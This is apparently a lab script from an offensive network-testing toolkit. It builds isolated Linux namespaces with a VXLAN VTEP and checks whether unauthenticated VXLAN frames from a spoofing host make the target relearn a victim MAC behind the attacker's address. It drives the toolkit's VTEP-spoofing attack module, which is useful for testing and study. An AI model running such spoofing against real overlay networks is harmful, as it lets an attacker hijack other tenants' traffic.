#!/usr/bin/env bash
# Isolated VXLAN VNI / VTEP spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces. Three hosts share an underlay bridge, and the target
# runs a VXLAN device for VNI 42 that learns inner MAC addresses:
#
#   underlay (ubr): 10.0.0.0/24, carries the VXLAN UDP traffic.
#   target:   VTEP at 10.0.0.2, VXLAN device vx0 with VNI 42 (learning on).
#   legit:    the VTEP that really hosts the victim MAC, at 10.0.0.1.
#   attacker: a host at 10.0.0.3 that sends VXLAN frames with the victim MAC as inner source.
#
# Phases:
#   Phase 1 (control): the legit VTEP sends a frame on VNI 42 with the victim MAC as inner source.
#            The target must learn the victim MAC behind 10.0.0.1. If it does not, exit 2.
#   Phase 2 (attack): the attacker sends frames on VNI 42 with the same inner MAC, from 10.0.0.3. The
#            target must move the victim MAC behind 10.0.0.3. The VXLAN frames are not authenticated.
#   Phase 3 (VNI check): the attacker sends a frame on VNI 43 with another inner MAC. The target has no
#            device for VNI 43, so it must learn nothing for that MAC. This is the VNI filter.
#
# Exit 0 when the control holds, the attack moves the MAC, and the wrong-VNI frame is ignored. Exit 1
# when the attack did not move the MAC or the VNI filter did not hold. Exit 2 when the control failed.
#
# Nothing here touches the host's real network interfaces. Vendor VTEPs are not tested.
#
# Usage:
#   sudo scripts/lab/vxlan_vtep_spoofing_lab.sh
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VNI=42
WRONG_VNI=43
VICTIM_MAC="02:00:00:00:00:50"
OTHER_MAC="02:00:00:00:00:60"
TARGET_MAC="02:00:00:00:10:02"
LEGIT_MAC="02:00:00:00:10:01"
ATTACKER_MAC="02:00:00:00:10:03"

stop_lab() {
    for ns in ul target legit attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add ul
ip netns add target
ip netns add legit
ip netns add attacker

ip netns exec ul ip link add ubr type bridge
ip netns exec ul ip link set ubr up

# host name, underlay address, MAC
HOSTS=("target:10.0.0.2:$TARGET_MAC" "legit:10.0.0.1:$LEGIT_MAC" "attacker:10.0.0.3:$ATTACKER_MAC")
for entry in "${HOSTS[@]}"; do
    IFS=: read -r ns ip mac <<<"$entry"
    ip link add "u-$ns" type veth peer name "e-$ns"
    ip link set "e-$ns" netns "$ns"
    ip link set "u-$ns" netns ul
    ip netns exec ul ip link set "u-$ns" master ubr
    ip netns exec ul ip link set "u-$ns" up
    ip netns exec "$ns" ip link set "e-$ns" address "$mac"
    ip netns exec "$ns" ip addr add "$ip/24" dev "e-$ns"
    ip netns exec "$ns" ip link set "e-$ns" up
    ip netns exec "$ns" ip link set lo up
done

# The target's VTEP: one VXLAN device, VNI 42, bound to its underlay interface. There is no device for VNI 43.
ip netns exec target ip link add vx0 type vxlan id "$VNI" dstport 4789 local 10.0.0.2 dev e-target
ip netns exec target ip link set vx0 up

SEND_CODE='
import sys, threading
from macabre.attacks.vxlan_vtep_spoofing import VxlanVtepSpoofingConfig, run_vxlan_vtep_spoofing
stats = run_vxlan_vtep_spoofing(
    VxlanVtepSpoofingConfig(
        iface=sys.argv[1], source_mac=sys.argv[2], outer_src_ip=sys.argv[3], outer_dst_ip="10.0.0.2",
        outer_dst_mac="02:00:00:00:10:02", vni=int(sys.argv[4]), inner_src_mac=sys.argv[5], frames=3,
    ),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# send_vxlan NS IFACE MAC IP VNI INNER_MAC
send_vxlan() {
    ip netns exec "$1" env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" "$2" "$3" "$4" "$5" "$6" 2>/dev/null || echo 0
    sleep 1
}

# Prints the VTEP address the target has learned for MAC on vx0, or "none".
learned_vtep() {
    local mac="$1" line
    line="$(ip netns exec target bridge fdb show dev vx0 2>/dev/null | grep -i "^$mac " | head -1 || true)"
    if [[ -z "$line" ]]; then
        echo none
    else
        echo "$line" | awk '{for (i = 1; i <= NF; i++) if ($i == "dst") print $(i + 1)}'
    fi
}

echo "Phase 1: control, the legit VTEP (10.0.0.1) sends on VNI $VNI with inner MAC $VICTIM_MAC"
send_vxlan legit e-legit "$LEGIT_MAC" 10.0.0.1 "$VNI" "$VICTIM_MAC" >/dev/null
CONTROL="$(learned_vtep "$VICTIM_MAC")"
echo "  $VICTIM_MAC learned behind: $CONTROL"
echo

echo "Phase 2: attacker (10.0.0.3) claims inner MAC $VICTIM_MAC on VNI $VNI"
ATTACK_SENT="$(send_vxlan attacker e-attacker "$ATTACKER_MAC" 10.0.0.3 "$VNI" "$VICTIM_MAC")"
echo "  frames sent: $ATTACK_SENT"
AFTER="$(learned_vtep "$VICTIM_MAC")"
echo "  $VICTIM_MAC learned behind: $AFTER"
echo

echo "Phase 3: attacker sends on VNI $WRONG_VNI with inner MAC $OTHER_MAC"
send_vxlan attacker e-attacker "$ATTACKER_MAC" 10.0.0.3 "$WRONG_VNI" "$OTHER_MAC" >/dev/null
WRONG="$(learned_vtep "$OTHER_MAC")"
echo "  $OTHER_MAC learned behind: $WRONG"
echo

if [[ "$CONTROL" != "10.0.0.1" ]]; then
    echo "Control: the target did not learn $VICTIM_MAC behind the legit VTEP. Result unreliable."
    exit 2
fi
if [[ "$AFTER" == "10.0.0.3" && "$WRONG" == "none" ]]; then
    echo "Result: the target moved $VICTIM_MAC from the legit VTEP (10.0.0.1) to the attacker's address (10.0.0.3) on VNI $VNI, with no authentication. A frame on VNI $WRONG_VNI was ignored, so the VNI decided which frames this VTEP accepted. Vulnerable."
    exit 0
fi
echo "Result: the MAC was $AFTER after the attack and the wrong-VNI frame gave $WRONG. The expected move did not hold. Not validated."
exit 1
